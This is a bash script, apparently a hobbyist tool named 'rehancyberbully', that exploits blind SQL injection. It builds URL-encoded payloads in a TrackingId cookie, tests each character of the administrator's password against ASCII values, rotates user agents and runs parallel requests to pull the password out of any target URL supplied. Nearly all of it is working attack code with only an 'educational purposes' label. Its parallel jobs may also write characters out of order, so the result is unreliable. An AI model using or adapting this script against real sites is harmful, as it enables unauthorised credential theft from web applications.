#!/bin/bash

# ------------------------------------------
#  rehancyberbully - Blind SQLi Exploiter
#  Author: Rehan (for educational purposes)
# ------------------------------------------

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Defaults
URL=""
COOKIE_TRACKING=""
COOKIE_SESSION=""
PASSWORD_LENGTH=20
THREADS=5
DELAY=0.1
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
OUTPUT_FILE="password.txt"
LOG_FILE="rehancyberbully.log"

# Help menu
usage() {
    echo -e "${GREEN}Usage:${NC}"
    echo -e "  $0 -u <url> -t <tracking_id> -s <session_cookie> [options]"
    echo -e "\n${GREEN}Options:${NC}"
    echo -e "  -u, --url              Target URL (required)"
    echo -e "  -t, --tracking-id       TrackingId cookie value (required)"
    echo -e "  -s, --session           Session cookie value (required)"
    echo -e "  -l, --length            Max password length (default: 20)"
    echo -e "  -T, --threads           Number of threads (default: 5)"
    echo -e "  -d, --delay             Delay between requests (default: 0.1s)"
    echo -e "  -o, --output            Output file (default: password.txt)"
    echo -e "  -L, --log               Log file (default: rehancyberbully.log)"
    echo -e "  -h, --help              Show this help"
    echo -e "\n${GREEN}Example:${NC}"
    echo -e "  $0 -u https://vuln.com -t 'abc123' -s 'xyz789' -T 10 -l 25"
    exit 1
}

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--url) URL="$2"; shift ;;
        -t|--tracking-id) COOKIE_TRACKING="$2"; shift ;;
        -s|--session) COOKIE_SESSION="$2"; shift ;;
        -l|--length) PASSWORD_LENGTH="$2"; shift ;;
        -T|--threads) THREADS="$2"; shift ;;
        -d|--delay) DELAY="$2"; shift ;;
        -o|--output) OUTPUT_FILE="$2"; shift ;;
        -L|--log) LOG_FILE="$2"; shift ;;
        -h|--help) usage ;;
        *) echo -e "${RED}[!] Unknown option: $1${NC}"; usage ;;
    esac
    shift
done

# Check required args
if [[ -z "$URL" || -z "$COOKIE_TRACKING" || -z "$COOKIE_SESSION" ]]; then
    echo -e "${RED}[!] Missing required arguments!${NC}"
    usage
fi

# Logging function
log() {
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# Random user-agent
random_agent() {
    local agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
    )
    echo "${agents[$RANDOM % ${#agents[@]}]}"
}

# Check if URL is reachable
check_url() {
    if ! curl -s -k -I "$URL" --user-agent "$USER_AGENT" >/dev/null; then
        log "${RED}[!] Target URL is unreachable!${NC}"
        exit 1
    fi
}

# Blind SQLi exploit
exploit() {
    local pos=$1
    for ((c=32; c<=126; c++)); do
        local sqli_payload="' AND (SELECT ASCII(SUBSTRING(password,$pos,1)) FROM users WHERE username='administrator')=$c--"
        local encoded_payload=$(printf "%s" "$sqli_payload" | xxd -p | tr -d '\n' | sed 's/\(..\)/%\1/g')
        local cookies="TrackingId=${COOKIE_TRACKING}${encoded_payload}; session=${COOKIE_SESSION}"
        
        local response=$(curl -s -k -A "$(random_agent)" -b "$cookies" "$URL")
        
        if echo "$response" | grep -q "Welcome"; then
            echo "$(printf "\\$(printf '%03o' "$c")")" >> "$OUTPUT_FILE"
            log "${GREEN}[+] Found char at position $pos: $(printf "\\$(printf '%03o' "$c")")${NC}"
            break
        fi
        
        sleep "$DELAY"
    done
}

# Main
main() {
    log "${YELLOW}[*] Starting rehancyberbully exploit${NC}"
    check_url
    log "[*] Target: $URL"
    log "[*] Extracting password (length: $PASSWORD_LENGTH)"
    log "[*] Using $THREADS threads"
    
    rm -f "$OUTPUT_FILE"
    touch "$OUTPUT_FILE"
    
    # Multi-threading
    for ((i=1; i<=PASSWORD_LENGTH; i++)); do
        while [[ $(jobs -r | wc -l) -ge $THREADS ]]; do
            sleep 0.5
        done
        exploit "$i" &
    done
    
    wait
    
    password=$(cat "$OUTPUT_FILE")
    log "${GREEN}[+] Password extracted: $password${NC}"
    exit 0
}

main